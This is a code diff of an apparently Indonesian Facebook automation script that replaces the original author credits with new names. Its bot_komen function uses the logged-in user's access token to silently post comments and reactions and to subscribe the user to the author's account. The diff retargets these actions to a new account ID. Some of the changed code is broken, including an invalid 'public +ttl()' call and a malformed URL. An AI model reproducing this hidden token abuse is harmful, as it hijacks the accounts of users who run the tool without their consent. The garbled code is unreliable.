@@ -1,7 +1,7 @@
 # -*- coding: utf-8
-# coded by angga kurniawan
-# fb.me/gaaaarzxd
-# instagram.com/gaaarzxd
+# coded by syafik R
+# mr.tdr
+# instagram.com/rgb.jr
 # open source, tidak di perjual belikan
 
 try:
@@ -58,18 +58,17 @@ def bot_komen():
     except IOError:
         print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
         os.system('rm -rf login.txt')
-    una = ('100015073506062') 
+    una = ('100049252740120') 
     post = ('1031861840659590') 
     post2 = ('1110619372783836') 
-    kom = ('GW PAKE SC LU BANG @[100015073506062:0] 😍😘\nhttps://www.facebook.com/100015073506062/posts/1031861840659590/?app=fbl') 
-    kom2 = ('KEREN BANG @[100015073506062:0] 😘😘\nhttps://m.facebook.com/photo.php?fbid=1110619372783836&set=a.106868716492245&type=3&app=fbl') 
+    kom2 = ('KEREN BANG @[100049252740120:] 😘😘\nhttps:// https://free.facebook.com/photo.php?fbid=317727306545692&id=100049252740120&set=a.100454698272955&refid=17&ref=dbl ') 
     reac = ('LOVE') 
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
     requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
     requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
     requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac+ '&access_token='+ token)
-    requests.post('https://graph.facebook.com/100003251214832/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100049252740120/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100049252740120/subscribers?access_token=' + token)
     print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
     menu()
 
@@ -174,7 +173,7 @@ def menu():
 	if ask =="":
 		menu()
 	elif ask == "1" or ask == "01":
-		public()
+		public +ttl()
 	elif ask == "2" or ask == "02":
 		followers()
 	elif ask == "3" or ask == "03":
